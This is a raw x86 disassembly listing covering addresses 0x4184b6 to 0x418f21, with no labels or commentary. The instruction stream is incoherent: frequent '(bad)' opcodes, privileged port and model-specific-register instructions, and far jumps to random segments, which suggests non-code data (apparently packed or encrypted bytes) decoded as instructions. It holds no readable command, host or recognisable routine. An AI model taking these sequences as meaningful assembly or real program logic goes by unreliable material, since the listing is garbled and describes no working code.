  4184b6:	xchg   BYTE PTR [esi],ah
  4184b8:	dec    ebx
  4184b9:	ror    DWORD PTR [esi-0x7c],0x1d
  4184bd:	mov    esp,0xe0634a3e
  4184c2:	push   edi
  4184c3:	inc    edx
  4184c4:	sub    eax,0x76a1622d
  4184c9:	inc    ecx
  4184ca:	xchg   ecx,eax
  4184cb:	in     eax,0x83
  4184cd:	xchg   eax,esi
  4184cf:	cmp    al,0xf3
  4184d1:	outs   dx,DWORD PTR ds:[esi]
  4184d2:	fist   WORD PTR [edi]
  4184d4:	mov    cl,0xaf
  4184d6:	int    0xe8
  4184d8:	push   cs
  4184d9:	pop    es
  4184da:	out    0x46,al
  4184dc:	stos   BYTE PTR es:[edi],al
  4184dd:	pushf  
  4184de:	and    al,0x88
  4184e0:	cmp    esp,0xfd16d0a3
  4184e6:	xchg   ecx,eax
  4184e7:	cwde   
  4184e8:	pop    edi
  4184e9:	dec    ebp
  4184ea:	fs test al,0x89
  4184ed:	je     0x418561
  4184ef:	inc    edi
  4184f0:	ja     0x41856b
  4184f2:	fcomp  QWORD PTR [ebx+ebx*2]
  4184f5:	sbb    esi,DWORD PTR [esi]
  4184f7:	sub    DWORD PTR [ebx+0x1c],0xffffffd2
  4184fb:	(bad)  
  4184fc:	sbb    eax,0x877e8a18
  418501:	add    dl,BYTE PTR [ebp-0x67]
  418504:	aad    0xd1
  418506:	ins    BYTE PTR es:[edi],dx
  418507:	call   0xc7eb2f2a
  41850c:	add    esi,DWORD PTR [esi-0x57]
  41850f:	jbe    0x4184a6
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	je     0x418599
  418582:	and    BYTE PTR [ebx+0x101c7],ah
  418588:	add    eax,0xbf000001
  41858d:	dec    edi
  41858e:	cli    
  41858f:	adc    al,BYTE PTR [ebp+0x4f]
  418592:	sub    al,0xb5
  418594:	pushf  
  418595:	out    0xfc,eax
  418597:	adc    dl,BYTE PTR [esi-0x4471e488]
  41859d:	rcr    BYTE PTR [edx+0x708677a3],1
  4185a3:	loope  0x41855b
  4185a5:	xchg   ebx,eax
  4185a6:	inc    ebp
  4185a7:	shl    DWORD PTR [ebp+0xf],0xbb
  4185ab:	outs   dx,BYTE PTR ds:[esi]
  4185ac:	pop    ss
  4185ad:	mov    edi,DWORD PTR [ebx]
  4185af:	aaa    
  4185b0:	mov    al,0x45
  4185b2:	adc    eax,0x34a83bfc
  4185b7:	hlt    
  4185b8:	xor    DWORD PTR [edi+edi*8-0x17],0x2f
  4185bd:	imul   esi,esp,0x197b68cd
  4185c3:	fwait
  4185c4:	leave  
  4185c5:	pushf  
  4185c6:	loopne 0x4185f5
  4185c8:	mov    WORD PTR [edi+ecx*1],ds
  4185cb:	xlat   BYTE PTR ds:[ebx]
  4185cc:	popf   
  4185cd:	lahf   
  4185ce:	call   0xeb7f:0x94e6409e
  4185d5:	mov    BYTE PTR [edx-0x1c],dh
  4185d8:	or     DWORD PTR [edx+0x78],edi
  4185db:	stos   BYTE PTR es:[edi],al
  4185dc:	jmp    0x81e20f6a
  4185e1:	cmp    WORD PTR [ebx-0x10],sp
  4185e5:	jl     0x41865a
  4185e7:	fincstp 
  4185e9:	dec    ebp
  4185ea:	dec    edx
  4185eb:	cmc    
  4185ec:	sbb    al,0x37
  4185ee:	mov    DWORD PTR [ecx],eax
  4185f0:	dec    edx
  4185f1:	mov    dl,0xda
  4185f3:	test   eax,0x3df8d5e1
  4185f8:	add    BYTE PTR [eax+0x3abced6f],al
  4185fe:	push   es
  4185ff:	ficom  DWORD PTR [esi-0x2a]
  418602:	pop    ds
  418603:	cmp    dh,ah
  418605:	jmp    0xba9d:0xeb4cb9ae
  41860c:	das    
  41860d:	sbb    dl,BYTE PTR [ebx-0x7599dd36]
  418613:	aaa    
  418614:	repz sub ebx,0xffffffcf
  418618:	mov    al,0x9c
  41861a:	into   
  41861b:	ja     0x4185e9
  41861d:	out    dx,al
  41861e:	xchg   ebx,eax
  41861f:	shr    DWORD PTR [ecx+edi*2+0x40],cl
  418623:	push   edi
  418624:	cmp    eax,0xf203eea3
  418629:	test   eax,0x1ec6e231
  41862e:	or     DWORD PTR [esi+0x44],ecx
  418631:	push   ecx
  418632:	or     eax,0xaa4ab8cd
  418637:	in     eax,dx
  418638:	xor    DWORD PTR [esi],eax
  41863a:	xchg   esp,eax
  41863b:	adc    edx,DWORD PTR [ecx+0xe]
  41863e:	xor    BYTE PTR [edi+0xdf2a20c],0x49
  418645:	out    0x8b,al
  418647:	push   edx
  418648:	xchg   edx,eax
  418649:	jmp    0x249e:0x5dd534e0
  418650:	jno    0x4186ca
  418652:	ja     0x4186b2
  418654:	jno    0x418688
  418656:	jmp    0xc6a28cae
  41865b:	push   0xffffffe3
  41865d:	ror    cl,1
  41865f:	pop    ss
  418660:	push   esp
  418661:	in     eax,0x36
  418663:	cld    
  418664:	push   0x9c1d7ca7
  418669:	and    eax,0xf637c075
  41866e:	pop    edi
  41866f:	pop    esi
  418670:	mov    ds:0x54ddafcf,eax
  418675:	icebp  
  418676:	jmp    0x41866b
  418678:	jl     0x4185fd
  41867a:	in     al,dx
  41867b:	inc    ecx
  41867c:	sahf   
  41867d:	lea    ebp,[ebp+0x6e6cc4a3]
  418683:	in     eax,dx
  418684:	ret    0x6942
  418687:	sbb    dh,dl
  418689:	lahf   
  41868a:	push   ds
  41868b:	(bad)  
  41868c:	xor    eax,0xb015e080
	...
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	push   es
  418701:	nop
  418702:	dec    esi
  418703:	dec    edi
  418704:	int3   
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0x69000001,al
  41870d:	mov    dl,0x86
  41870f:	jle    0x418754
  418711:	push   ecx
  418712:	outs   dx,BYTE PTR ds:[esi]
  418713:	jns    0x41876f
  418715:	adc    cl,BYTE PTR [edx+0x72]
  418718:	js     0x418768
  41871a:	aam    0x64
  41871c:	int3   
  41871d:	scas   eax,DWORD PTR es:[edi]
  41871e:	dec    ebp
  41871f:	xor    bh,cl
  418721:	adc    eax,DWORD PTR [edi+edi*1+0x3e]
  418725:	stos   DWORD PTR es:[edi],eax
  418726:	jmp    0x226deb33
  41872b:	mov    eax,0x6a081a93
  418730:	jge    0x4186c0
  418732:	(bad)  
  418733:	repz sub eax,0x2536fef2
  418739:	or     bl,BYTE PTR [ecx+0x57]
  41873c:	mov    ecx,0x2e88a80
  418741:	imul   edi,DWORD PTR [esi-0x7e],0x1174cc35
  418748:	jmp    0x708f:0xc4cf0ce
  41874f:	retf   0xca27
  418752:	xor    esi,DWORD PTR [eax+0x6b]
  418755:	mov    cl,0xea
  418757:	jg     0x4187ab
  418759:	daa    
  41875a:	cld    
  41875b:	mov    ecx,0x8276eeec
  418760:	iret   
  418761:	jnp    0x4186f7
  418763:	mov    al,ds:0x6bddcf2e
  418768:	jo     0x4186f3
  41876a:	dec    eax
  41876b:	jns    0x4187ec
  41876d:	fcom   DWORD PTR [ebx+0x52]
  418770:	imul   edi,DWORD PTR [esi+0x3e],0x254b5d6c
  418777:	addr16 jp 0x4187dc
  41877a:	or     cl,BYTE PTR [eax]
  41877c:	in     eax,dx
  41877d:	in     al,0x17
  41877f:	fcomip st,st(5)
  418781:	inc    edi
  418782:	out    0x9d,eax
  418784:	push   edx
  418785:	sub    esi,ecx
  418787:	push   ebp
  418788:	adc    dh,cl
  41878a:	jb     0x4187b2
  41878c:	xchg   DWORD PTR [ebx+0x5818acc5],eax
  418792:	cmc    
  418793:	into   
  418794:	mov    al,0xf6
  418796:	stc    
  418797:	mov    ecx,DWORD PTR [edi-0x5300597b]
  41879d:	call   0x3ebd41c
  4187a2:	mov    ch,0xe9
  4187a4:	adc    eax,0x76daa451
  4187a9:	hlt    
  4187aa:	fs pop ecx
  4187ac:	jae    0x4187b1
  4187ae:	in     al,0xb8
  4187b0:	xchg   ebx,eax
  4187b1:	dec    esp
  4187b2:	pop    ss
  4187b3:	ret    0xfc59
  4187b6:	out    dx,eax
  4187b7:	push   edi
  4187b8:	or     BYTE PTR [ebx+0x1ed2c02d],ah
  4187be:	clc    
  4187bf:	out    dx,al
  4187c0:	int    0x17
  4187c2:	and    esi,ebp
  4187c4:	int    0x96
  4187c6:	mov    cl,0x95
  4187c8:	dec    esi
  4187c9:	mov    eax,0x67666cb2
  4187ce:	push   ss
  4187cf:	adc    eax,0x18b6d2a4
  4187d4:	(bad)  [esi]
  4187d6:	test   eax,0xb9b40893
  4187db:	jp     0x418791
  4187dd:	inc    ebp
  4187de:	inc    esp
  4187df:	push   ebp
  4187e0:	shr    BYTE PTR ds:[edi+eax*1-0x3],cl
  4187e5:	(bad)
  4187e9:	or     al,al
  4187eb:	sahf   
  4187ec:	(bad)  [ebx-0x75]
  4187ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187f0:	mov    cs,WORD PTR [esi+0x46b2b9aa]
  4187f6:	(bad)  [eax-0x145b527c]
  4187fc:	ret    
  4187fd:	dec    esp
  4187fe:	pop    es
  4187ff:	adc    al,0x43
  418801:	mov    ebp,esp
  418803:	and    DWORD PTR [eax+eiz*1+0x9bb9120],ecx
  41880a:	xor    eax,edx
  41880c:	pop    ss
  41880d:	xchg   esp,eax
  41880e:	mov    ah,0x19
  418810:	cmp    al,0x0
	...
  418872:	add    BYTE PTR [eax],al
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi-0x2763c533]
  418881:	jg     0x41885a
  418883:	dec    ebx
  418884:	rol    DWORD PTR [ebx],1
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0x78000001
  41888d:	(bad)  
  41888e:	popf   
  41888f:	xor    ch,cl
  418891:	stos   BYTE PTR es:[edi],al
  418892:	and    al,cl
  418894:	mov    ds:0xd394a70,al
  418899:	(bad)  
  41889a:	jmp    0x147dbe64
  41889f:	div    BYTE PTR [ecx+edi*2-0x78]
  4188a3:	ins    BYTE PTR es:[edi],dx
  4188a4:	vmread ecx,ecx
  4188a7:	jp     0x418872
  4188a9:	cwde   
  4188aa:	outs   dx,DWORD PTR ds:[esi]
  4188ab:	bound  edx,QWORD PTR [ebp-0x14]
  4188ae:	and    esi,ebp
  4188b0:	xchg   ecx,eax
  4188b1:	inc    eax
  4188b2:	jb     0x41892b
  4188b4:	pop    edx
  4188b5:	loopne 0x4188e9
  4188b7:	ja     0x418906
  4188b9:	mov    ds:0xf4a40bf7,al
  4188be:	sti    
  4188bf:	lods   al,BYTE PTR ds:[esi]
  4188c0:	daa    
  4188c1:	fistp  QWORD PTR [edi+0x51]
  4188c4:	fnstsw WORD PTR [ecx]
  4188c6:	lods   eax,DWORD PTR ds:[esi]
  4188c7:	xchg   edx,eax
  4188c8:	mov    ebp,0x784adabf
  4188cd:	xor    eax,0xfca838a9
  4188d2:	test   ecx,ebp
  4188d4:	jne    0x418893
  4188d6:	aad    0xf3
  4188d8:	(bad)  
  4188d9:	mov    edx,ecx
  4188db:	add    BYTE PTR [eax-0x37e6cc12],0x70
  4188e2:	dec    ecx
  4188e3:	mov    eax,0x48a023f
  4188e8:	loope  0x4188dc
  4188ea:	push   0xb62bd7eb
  4188ef:	jno    0x4188b2
  4188f1:	je     0x41889c
  4188f3:	sbb    ecx,DWORD PTR [ecx+0x6b1f3caa]
  4188f9:	hlt    
  4188fa:	dec    ecx
  4188fb:	bound  eax,QWORD PTR [ecx+0x72]
  4188fe:	xchg   ebp,eax
  4188ff:	or     eax,edi
  418901:	pop    esi
  418902:	sub    al,0x23
  418904:	ja     0x418974
  418906:	or     eax,ebx
  418908:	imul   eax,DWORD PTR [edi],0xffffffa6
  41890b:	add    esp,edi
  41890d:	add    al,0xbc
  41890f:	loop   0x41897e
  418911:	xlat   BYTE PTR ds:[ebx]
  418912:	dec    esi
  418913:	jno    0x4188cf
  418915:	jb     0x41890e
  418917:	stc    
  418918:	jl     0x418987
  41891a:	mov    al,ds:0xce8ddb1c
  41891f:	test   cl,al
  418921:	rcl    DWORD PTR [edi],0x2d
  418924:	jecxz  0x4188c1
  418926:	loopne 0x4188ae
  418928:	in     al,dx
  418929:	imul   ebx,DWORD PTR [esi+0x53],0x3e2f69d3
  418930:	sbb    BYTE PTR [edi],ch
  418932:	lods   al,BYTE PTR ds:[esi]
  418933:	jns    0x41898d
  418935:	shr    DWORD PTR [ebp+0x399c5852],0x74
  41893c:	sbb    eax,0xe4996cc0
  418941:	lock scas al,BYTE PTR es:[edi]
  418943:	pop    ebx
  418944:	in     al,dx
  418945:	(bad)  
  418947:	inc    ebx
  418948:	pop    edx
  418949:	ss (bad) 
  41894b:	fist   WORD PTR [ebx+edi*4+0x31]
  41894f:	ret    0x6496
  418952:	xchg   esi,eax
  418953:	xchg   ecx,eax
  418954:	pushf  
  418955:	cmp    ecx,ebp
  418957:	pop    ebx
  418958:	adc    bl,dl
  41895a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41895b:	push   ecx
  41895c:	and    BYTE PTR [ebx],bl
  41895e:	jno    0x418939
  418960:	int    0xb9
  418962:	xchg   ebp,eax
  418963:	out    0xfa,eax
  418965:	rcr    DWORD PTR [edi+0x3b],0x2c
  418969:	bnd jns 0x41898c
  41896c:	cwde   
  41896d:	rcr    BYTE PTR [ecx+0x54],1
  418970:	dec    esp
  418971:	mov    al,0x2f
  418973:	hlt    
  418974:	dec    edx
  418975:	xchg   esp,eax
  418976:	(bad)  
  418977:	fs and eax,0x6c3555ae
  41897d:	cmp    ebx,DWORD PTR [edx]
  41897f:	jo     0x4189dd
  418981:	ret    0x97a
  418984:	pop    eax
  418985:	xchg   esi,eax
  418986:	mov    esp,0x7e04f4c
  41898b:	ret    
  41898c:	sub    bh,BYTE PTR [ebx+0xf34d4c]
	...
  4189f2:	add    BYTE PTR [eax],al
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x97538b69
  418a03:	lahf   
  418a04:	(bad)  
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0xa8000001,al
  418a0d:	push   edi
  418a0e:	loopne 0x418a4d
  418a10:	mov    eax,0x1e076dd1
  418a15:	cmc    
  418a16:	cmc    
  418a17:	xor    esi,ebp
  418a19:	push   esi
  418a1a:	fmulp  st(3),st
  418a1c:	mov    bh,0x7a
  418a1e:	inc    ebp
  418a1f:	je     0x4189ac
  418a21:	mov    dh,0x35
  418a23:	(bad)  [ecx-0x2e260265]
  418a29:	xor    al,0xbc
  418a2c:	jmp    0x56ee:0xa2d2d4bf
  418a33:	sar    DWORD PTR [edi],0x1
  418a36:	inc    edi
  418a37:	scas   eax,DWORD PTR es:[edi]
  418a38:	jmp    0x418a5c
  418a3a:	pusha  
  418a3b:	sbb    DWORD PTR [ebp-0x65a9471f],eax
  418a41:	mov    ds:0x462adcd,eax
  418a46:	and    BYTE PTR [edi+ebp*8+0x4b],0xae
  418a4b:	jbe    0x418aa9
  418a4d:	push   esi
  418a4e:	jg     0x418a09
  418a50:	out    0x4c,al
  418a52:	test   BYTE PTR [edx-0x12],bl
  418a55:	clc    
  418a56:	iret   
  418a57:	cmp    BYTE PTR [ecx],0x4f
  418a5a:	lds    ebp,FWORD PTR [ecx+0x7333c1be]
  418a60:	jo     0x418a3f
  418a62:	sbb    DWORD PTR [edi+0x1a],esp
  418a65:	jg     0x418aa2
  418a67:	imul   esp,DWORD PTR [esi],0xffffffcb
  418a6a:	in     al,0x96
  418a6c:	adc    DWORD PTR [ecx-0x63],ecx
  418a6f:	jecxz  0x4189f2
  418a71:	(bad)  [esi+eax*2+0x10]
  418a75:	xchg   edx,eax
  418a76:	adc    esi,ebx
  418a78:	aaa    
  418a79:	cmp    bl,BYTE PTR [eax-0x80]
  418a7c:	rol    BYTE PTR [ebx-0x41a76b5e],0x4e
  418a83:	xchg   ecx,eax
  418a84:	pop    edi
  418a85:	mov    ds:0xa7b2c814,al
  418a8a:	push   ds
  418a8b:	bound  esi,QWORD PTR [edi-0x20]
  418a8e:	sub    ah,BYTE PTR [ecx+0x2e7582c]
  418a94:	call   FWORD PTR [ecx+0x38]
  418a97:	sbb    esp,edi
  418a99:	stos   BYTE PTR es:[edi],al
  418a9a:	mov    al,ds:0x2a90eea6
  418a9f:	jae    0x418a9d
  418aa1:	push   ds
  418aa2:	xor    esi,ebp
  418aa4:	lock inc edi
  418aa6:	and    DWORD PTR [edx+0x7d97dd3c],esi
  418aac:	adc    bl,BYTE PTR [ebx-0x17]
  418aaf:	adc    al,0x49
  418ab1:	mov    cl,BYTE PTR [eax]
  418ab3:	adc    ch,bh
  418ab5:	xchg   ecx,eax
  418ab6:	mov    esp,0x2c6c580d
  418abb:	in     eax,0x25
  418abd:	into   
  418abe:	dec    ecx
  418abf:	sub    eax,0xc156777
  418ac4:	jge    0x418a9d
  418ac6:	imul   eax,ebp,0xffffff84
  418ac9:	sub    BYTE PTR [ecx+0x66a8d62],ch
  418acf:	dec    ebp
  418ad0:	dec    esi
  418ad1:	call   DWORD PTR [ecx]
  418ad3:	sub    bh,BYTE PTR [ebx+0x3b]
  418ad6:	jnp    0x418b00
  418ad8:	ret    0xb505
  418adb:	mov    al,ds:0x6ee58d7d
  418ae0:	mov    esi,0x12c93386
  418ae5:	ror    BYTE PTR [eax+0x65cf618b],cl
  418aeb:	das    
  418aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aed:	out    dx,al
  418aee:	nop
  418aef:	cmp    BYTE PTR [edx+0x4d],dl
  418af2:	add    DWORD PTR [edx+ecx*2],0x3
  418af6:	test   eax,0x63cbddd7
  418afb:	mov    ebp,0x3cad64ed
  418b00:	mov    ebx,0x48ec87e1
  418b05:	pop    esp
  418b06:	add    al,0x8d
  418b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b09:	int    0xe4
  418b0b:	cmp    eax,ebx
  418b0d:	in     al,dx
  418b0e:	push   0x100a
	...
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xee
  418b81:	and    ebx,DWORD PTR [eax]
  418b83:	ret    0x5db
  418b86:	add    DWORD PTR [eax],eax
  418b88:	add    eax,0x68000001
  418b8d:	mov    esi,0x757511c
  418b92:	or     edx,DWORD PTR [edi]
  418b94:	jmp    0x418c14
  418b96:	mov    bh,0x4a
  418b98:	daa    
  418b99:	cli    
  418b9a:	push   ecx
  418b9b:	fidiv  WORD PTR [ecx-0x7c]
  418b9e:	fdivp  st(2),st
  418ba0:	jbe    0x418c19
  418ba2:	adc    eax,0xda9cf3d9
  418ba7:	(bad)  
  418ba8:	std    
  418ba9:	icebp  
  418baa:	ror    BYTE PTR [ebx],cl
  418bac:	test   eax,0xa663dbeb
  418bb1:	cmp    BYTE PTR [ebx-0x22a04cc0],0xde
  418bb8:	add    eax,DWORD PTR [edi]
  418bba:	lahf   
  418bbb:	je     0x418bc7
  418bbd:	inc    edx
  418bbe:	mov    al,0x85
  418bc0:	popf   
  418bc1:	mov    ch,0x6b
  418bc3:	and    ebp,ebx
  418bc5:	aam    0x68
  418bc7:	fld    QWORD PTR [ecx+0x3bca8832]
  418bcd:	clc    
  418bce:	fisttp WORD PTR [eax+ebx*2-0x2e]
  418bd2:	mov    esp,DWORD PTR [esp+edi*2]
  418bd5:	mov    eax,ds:0x45d029d7
  418bda:	stos   DWORD PTR es:[edi],eax
  418bdb:	push   cs
  418bdc:	xchg   edx,eax
  418bdd:	mov    ebx,0x6126956d
  418be2:	shl    DWORD PTR [eax+ebp*8+0x6b],1
  418be6:	jnp    0x418c42
  418be8:	retf   0x1b60
  418beb:	stos   BYTE PTR es:[edi],al
  418bec:	dec    edi
  418bed:	dec    esp
  418bee:	sub    eax,0x12f3c0c6
  418bf3:	sahf   
  418bf4:	xchg   esi,eax
  418bf5:	mov    cl,0xf1
  418bf7:	and    dh,dh
  418bf9:	loopne 0x418b99
  418bfb:	lds    eax,FWORD PTR [esp+esi*4-0x3c]
  418bff:	les    esp,FWORD PTR [ecx+ebp*8+0x7b]
  418c03:	lock mov bl,0x47
  418c06:	cs cld 
  418c08:	adc    ecx,ecx
  418c0a:	lahf   
  418c0b:	dec    esi
  418c0c:	or     ecx,ebx
  418c0e:	mul    BYTE PTR [ebx+0x24]
  418c11:	cmp    BYTE PTR [edx+esi*8-0x4e016be5],ch
  418c18:	and    BYTE PTR [ebx],dh
  418c1a:	sub    BYTE PTR [ebx+0x72],0x4a
  418c1e:	(bad)  
  418c1f:	cli    
  418c20:	adc    eax,0xdf84f3a6
  418c25:	mov    eax,0xa7faf630
  418c2a:	idiv   BYTE PTR [esi-0x299a9586]
  418c30:	jbe    0x418c6b
  418c32:	hlt    
  418c33:	loope  0x418c37
  418c35:	sar    DWORD PTR [ebp+0x447804c0],cl
  418c3b:	and    ebx,DWORD PTR [eax-0xe]
  418c3e:	int    0xf8
  418c40:	dec    ecx
  418c41:	out    0xd3,al
  418c43:	xchg   ecx,eax
  418c45:	gs cld 
  418c47:	mov    dh,0xe5
  418c49:	loop   0x418c04
  418c4b:	popf   
  418c4c:	data16 jg 0x418bde
  418c4f:	int    0x19
  418c51:	mov    eax,0x93634835
  418c56:	cdq    
  418c57:	(bad)  
  418c59:	cdq    
  418c5a:	fwait
  418c5b:	lea    edi,[esp+ebp*4]
  418c5e:	mov    es,WORD PTR [ecx-0xc]
  418c61:	xor    eax,0x6577bb37
  418c66:	or     ebp,esp
  418c68:	mov    ss,WORD PTR [esi-0x39]
  418c6b:	cld    
  418c6c:	iret   
  418c6d:	xchg   DWORD PTR [ecx+0x4f],ecx
  418c70:	xor    DWORD PTR [ebx],ebx
  418c72:	pop    esp
  418c73:	pop    eax
  418c74:	scas   al,BYTE PTR es:[edi]
  418c75:	sub    ebx,DWORD PTR [eax]
  418c77:	xor    al,0x5a
  418c79:	retw   
  418c7b:	rcr    ecx,0xe6
  418c7e:	scas   eax,DWORD PTR es:[edi]
  418c7f:	adc    eax,0x7729ea08
  418c84:	lods   al,BYTE PTR ds:[esi]
  418c85:	push   0x9154f1ed
  418c8a:	add    esi,esi
  418c8c:	loopne 0x418ced
  418c8e:	jle    0x418cd6
  418c90:	pop    edx
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	rcr    BYTE PTR [ecx-0x1fb36569],cl
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0x3d000001
  418d0d:	cli    
  418d0e:	sub    al,BYTE PTR [esi]
  418d10:	sub    eax,0x99e4e950
  418d15:	jmp    0x57bd9dd6
  418d1a:	sub    ah,BYTE PTR [esi+edi*8]
  418d1d:	jnp    0x418d65
  418d1f:	push   esi
  418d20:	pop    ss
  418d21:	fwait
  418d22:	ds popa 
  418d24:	inc    ecx
  418d25:	dec    ebx
  418d26:	wrmsr  
  418d28:	jecxz  0x418d55
  418d2a:	dec    ebp
  418d2b:	push   edi
  418d2c:	mov    al,0x7d
  418d2e:	shl    dh,cl
  418d30:	inc    esi
  418d31:	stc    
  418d32:	rcl    DWORD PTR [ebx+ebp*1-0x647742ad],cl
  418d39:	or     BYTE PTR ds:0x59e1f4c9,dh
  418d3f:	xchg   ebp,eax
  418d40:	xor    al,0xf
  418d42:	jp     0x418cd7
  418d44:	adc    eax,edi
  418d46:	std    
  418d47:	mov    ecx,0x4f58a949
  418d4c:	test   al,0x4f
  418d4e:	sbb    eax,0xc6787e75
  418d53:	mov    al,0x32
  418d55:	mov    eax,0xa37765e0
  418d5a:	xchg   ebx,eax
  418d5b:	inc    esi
  418d5c:	and    eax,0xc5e8d579
  418d61:	retf   0xfec
  418d64:	pop    ebp
  418d65:	xlat   BYTE PTR ds:[ebx]
  418d66:	jmp    0xb61f69e9
  418d6b:	stc    
  418d6c:	aam    0xba
  418d6e:	pop    ecx
  418d6f:	fcmovnbe st,st(6)
  418d71:	stos   BYTE PTR es:[edi],al
  418d72:	mov    dl,0xe0
  418d74:	mov    cl,0x6e
  418d76:	add    edi,0x2ce0b516
  418d7c:	pop    esi
  418d7d:	xchg   esp,eax
  418d7e:	das    
  418d7f:	das    
  418d80:	pop    ecx
  418d81:	rcl    edx,0x6f
  418d84:	cmp    ecx,DWORD PTR [esi+0x4e32e558]
  418d8a:	arpl   ax,bx
  418d8c:	inc    edx
  418d8d:	xchg   esi,eax
  418d8e:	add    dh,ah
  418d90:	cmp    BYTE PTR [edi],bl
  418d92:	lods   al,BYTE PTR ds:[esi]
  418d93:	and    bh,BYTE PTR [ecx+eiz*1-0x57]
  418d97:	lock stc 
  418d99:	loopne 0x418deb
  418d9b:	mov    al,0xb0
  418d9d:	lods   al,BYTE PTR fs:[esi]
  418d9f:	test   al,0xe9
  418da1:	sub    ah,BYTE PTR [ecx]
  418da3:	aad    0x64
  418da5:	xor    BYTE PTR [ebx-0x46],ch
  418da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418da9:	add    al,0x25
  418dac:	sub    BYTE PTR [edx-0x114c7faf],ch
  418db2:	xchg   al,bl
  418db4:	mov    eax,0x710bd13b
  418db9:	mov    DWORD PTR [edi+0x1f],esp
  418dbc:	ins    BYTE PTR es:[edi],dx
  418dbd:	mov    bl,0xe
  418dbf:	scas   eax,DWORD PTR es:[edi]
  418dc0:	test   bh,0x2
  418dc3:	retf   0x7dc9
  418dc6:	xchg   edi,eax
  418dc7:	clc    
  418dc8:	or     BYTE PTR [eax-0x66],0x94
  418dcc:	call   0x9c8c:0x7e746286
  418dd3:	aaa    
  418dd4:	(bad)  
  418dd5:	and    al,cl
  418dd7:	jns    0x418d6d
  418dd9:	dec    edx
  418dda:	iret   
  418ddb:	iret   
  418ddc:	inc    dh
  418dde:	jp     0x418e0b
  418de0:	xor    eax,DWORD PTR [edx-0x78181f5]
  418de6:	mov    ds,WORD PTR [ebx-0x3446f828]
  418dec:	jb     0x418df2
  418dee:	cmp    cl,BYTE PTR ds:0x730b21d7
  418df4:	popf   
  418df5:	out    0x5c,eax
  418df7:	cdq    
  418df8:	lahf   
  418df9:	fidivr WORD PTR [ecx+0x5c]
  418dfc:	out    dx,eax
  418dfd:	cmp    BYTE PTR [eax-0x5664c839],bh
  418e03:	ror    DWORD PTR [ebp+0x36],0x5b
  418e07:	or     DWORD PTR [ecx-0x132d4d69],edx
  418e0d:	shl    BYTE PTR [esp+ecx*1],cl
  418e10:	aam    0x0
	...
  418e72:	add    BYTE PTR [eax],al
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x48]
  418e81:	gs (bad) 
  418e83:	pop    esp
  418e84:	in     eax,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0xbc000001
  418e8d:	adc    BYTE PTR [ebx+ebx*1-0x738731fa],0x3a
  418e95:	retf   
  418e96:	add    DWORD PTR [edx],ebp
  418e98:	pop    esi
  418e99:	inc    eax
  418e9a:	ins    BYTE PTR es:[edi],dx
  418e9b:	xor    ch,bl
  418e9d:	adc    eax,DWORD PTR [ebp+0x6]
  418ea0:	pop    ss
  418ea1:	test   BYTE PTR [edi+0x32],0x6e
  418ea5:	add    DWORD PTR [eax-0x37b5f028],ecx
  418eab:	out    dx,al
  418eac:	adc    DWORD PTR [ebp+0x49cff341],ebx
  418eb2:	fistp  DWORD PTR [ebx]
  418eb4:	in     eax,0x3f
  418eb6:	push   0xffffffad
  418eb8:	pop    ecx
  418eb9:	call   0xae6e:0x833eeba0
  418ec0:	inc    ecx
  418ec1:	imul   eax,DWORD PTR [ebp-0x24],0x93735fe5
  418ec8:	sbb    al,0x60
  418eca:	mov    ds:0x48ed2622,eax
  418ecf:	inc    eax
  418ed0:	or     BYTE PTR [esi+edx*2+0x4808b9b8],0x75
  418ed8:	fnstcw WORD PTR [edx-0x4c43fdbf]
  418ede:	xchg   ecx,eax
  418edf:	mov    ebp,DWORD PTR [edi+0x31cdca86]
  418ee5:	aaa    
  418ee6:	dec    edi
  418ee7:	in     eax,dx
  418ee8:	cdq    
  418ee9:	jae    0x418ea8
  418eeb:	pusha  
  418eec:	imul   ebx,DWORD PTR [edi-0x48f0d889],0xdfd7a924
  418ef6:	mov    edx,0x8fad64dc
  418efb:	es stos BYTE PTR es:[edi],al
  418efd:	fst    DWORD PTR ds:0xa9b836a6
  418f03:	pusha  
  418f04:	call   FWORD PTR [ebp+edx*2-0xc]
  418f08:	and    al,0xa5
  418f0a:	arpl   WORD PTR [esi],dx
  418f0c:	xor    eax,0x5f4f95c3
  418f11:	mov    cl,0xe2
  418f13:	jp     0x418eba
  418f15:	in     eax,dx
  418f16:	daa    
  418f17:	out    dx,eax
  418f18:	sub    al,0x93
  418f1a:	dec    ebx
  418f1b:	data16 mov dl,0x1a
  418f1e:	mov    al,0xc5
  418f20:	push   es
  418f21:	imul   esp,DWORD PTR [edx+0x4f2a3551],0x50
